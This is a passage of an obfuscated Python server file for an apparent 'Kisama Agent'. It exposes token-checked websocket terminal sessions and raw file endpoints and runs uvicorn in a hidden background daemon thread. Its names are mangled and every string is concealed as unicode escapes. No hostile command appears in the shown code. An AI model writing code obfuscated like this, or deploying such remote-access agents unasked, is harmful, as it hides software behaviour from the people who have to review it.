            Logger.warning(codecs.decode('\\U0001f6a8\\u0020\\u005b\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u0020', 'unicode_escape') + str(request_id) + codecs.decode('\\u005d\\u0020\\u8ba4\\u8bc1\\u5931\\u8d25\\uff0c\\u975e\\u6cd5\\u0020\\u0054\\u006f\\u006b\\u0065\\u006e\\uff01', 'unicode_escape'))
            return
        Logger.info(codecs.decode('\\u2705\\u0020\\u005b\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u0020', 'unicode_escape') + str(request_id) + codecs.decode('\\u005d\\u0020\\u0054\\u006f\\u006b\\u0065\\u006e\\u0020\\u8ba4\\u8bc1\\u901a\\u8fc7\\u0020\\u0028\\u0048\\u0054\\u0054\\u0050\\u0053\\u0020\\u964d\\u7ea7\\u6a21\\u5f0f\\u0029', 'unicode_escape'))
    await O0_var_2107.start_session(websocket, request_id, O0_var_2108, meta_requested=meta == codecs.decode('\\u0031', 'unicode_escape'), incognito_requested=incognito == codecs.decode('\\u0031', 'unicode_escape'))

@app.exception_handler(FileOperationError)
async def O0_fn_108(request: Request, exc: FileOperationError):
    O0_var_2110 = str(exc.detail)
    O0_var_2111 = {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): O0_var_2110, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): O0_var_2110, codecs.decode('\\u0072\\u0065\\u0061\\u0073\\u006f\\u006e', 'unicode_escape'): exc.reason}
    if request.url.path == codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u0072\\u0061\\u0077', 'unicode_escape'):
        O0_var_2111[codecs.decode('\\u0063\\u006f\\u006d\\u0070\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape')] = False
    return JSONResponse(status_code=exc.status_code, content=O0_var_2111)

@app.exception_handler(HTTPException)
async def O0_fn_109(request: Request, exc: HTTPException):
    O0_var_2112 = {codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): exc.detail, codecs.decode('\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): exc.status_code}
    return JSONResponse(status_code=exc.status_code, content=O0_var_2112)

class NoSignalsUvicornServer(uvicorn.Server):
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u81ea\\u5b9a\\u4e49\\u0020\\u0055\\u0076\\u0069\\u0063\\u006f\\u0072\\u006e\\u0020\\u670d\\u52a1\\u5668\\u7c7b\\u000a\\u0020\\u0020\\u0020\\u0020\\U0001f31f\\u0020\\u6838\\u5fc3\\u6280\\u5de7\\uff1a\\u91cd\\u5199\\u4fe1\\u53f7\\u5b89\\u88c5\\u51fd\\u6570\\u3002\\u76f4\\u63a5\\u0020\\u0070\\u0061\\u0073\\u0073\\u0020\\u6389\\uff0c\\u963b\\u6b62\\u0020\\u0055\\u0076\\u0069\\u0063\\u006f\\u0072\\u006e\\u0020\\u5c1d\\u8bd5\\u5728\\u5b50\\u7ebf\\u7a0b\\u000a\\u0020\\u0020\\u0020\\u0020\\u6ce8\\u518c\\u4e3b\\u7ebf\\u7a0b\\u4e13\\u7528\\u7684\\u7cfb\\u7edf\\u4fe1\\u53f7\\uff08\\u89e3\\u51b3\\u0020\\u0056\\u0061\\u006c\\u0075\\u0065\\u0045\\u0072\\u0072\\u006f\\u0072\\u003a\\u0020\\u0073\\u0065\\u0074\\u005f\\u0077\\u0061\\u006b\\u0065\\u0075\\u0070\\u005f\\u0066\\u0064\\u0020\\u006f\\u006e\\u006c\\u0079\\u0020\\u0077\\u006f\\u0072\\u006b\\u0073\\u0020\\u0069\\u006e\\u0020\\u006d\\u0061\\u0069\\u006e\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\uff09\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def install_signal_handlers(self) -> None:
        pass

def _start_uvicorn_server(O0_var_2113, host, port, log_level):
    O0_var_2114 = asyncio.new_event_loop()
    asyncio.set_event_loop(O0_var_2114)
    O0_var_2115 = uvicorn.Config(app=O0_var_2113, host=host, port=port, reload=False, log_level=log_level)
    O0_var_2116 = NoSignalsUvicornServer(O0_var_2115)
    O0_var_2116.run()

def O0_fn_110(blocking: bool=False):
    Config.validate()
    O0_fn_4()
    O0_var_2117 = codecs.decode('\\u0064\\u0065\\u0062\\u0075\\u0067', 'unicode_escape') if Config.DEBUG else codecs.decode('\\u0069\\u006e\\u0066\\u006f', 'unicode_escape')
    if Config.DEBUG:
        Logger.warning(codecs.decode('\\u26a0\\ufe0f\\u0020\\u5f53\\u524d\\u5904\\u4e8e\\u0020\\u0044\\u0045\\u0042\\u0055\\u0047\\u0020\\u6a21\\u5f0f\\uff0c\\u4f46\\u7531\\u4e8e\\u91c7\\u7528\\u4e86\\u975e\\u963b\\u585e\\u540e\\u53f0\\u6302\\u8f7d\\uff0c\\u5df2\\u81ea\\u52a8\\u5173\\u95ed\\u70ed\\u91cd\\u8f7d\\u0028\\u0052\\u0065\\u006c\\u006f\\u0061\\u0064\\u0029\\u529f\\u80fd\\u3002', 'unicode_escape'))
    Logger.info(codecs.decode('\\u0020\\U0001f680\\u0020\\u004b\\u0069\\u0073\\u0061\\u006d\\u0061\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074\\u0020\\u5f00\\u59cb\\u5728\\u540e\\u53f0\\u5b88\\u62a4\\u7ebf\\u7a0b\\u4e2d\\u542f\\u52a8\\u002e\\u002e\\u002e', 'unicode_escape'))
    O0_var_2118 = threading.Thread(target=_start_uvicorn_server, args=(app, Config.HOST, Config.PORT, O0_var_2117), daemon=True)
    O0_var_2118.start()
    Logger.info(codecs.decode('\\u0020\\u005b\\u002d\\u005d\\u0020\\u540e\\u53f0\\u670d\\u52a1\\u5df2\\u6210\\u529f\\u6302\\u8f7d\\uff0c\\u6b63\\u5728\\u76d1\\u542c\\u7aef\\u53e3\\u003a\\u0020', 'unicode_escape') + str(Config.PORT))
    if blocking:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            Logger.info(codecs.decode('\\U0001f6d1\\u0020\\u6536\\u5230\\u7ec8\\u6b62\\u4fe1\\u53f7\\uff0c\\u004b\\u0069\\u0073\\u0061\\u006d\\u0061\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074\\u0020\\u5b88\\u62a4\\u8fdb\\u7a0b\\u5df2\\u5b89\\u5168\\u9000\\u51fa\\u3002', 'unicode_escape'))

def cli():
    O0_fn_110(blocking=True)
if __name__ == codecs.decode('\\u005f\\u005f\\u006d\\u0061\\u0069\\u006e\\u005f\\u005f', 'unicode_escape'):
    cli()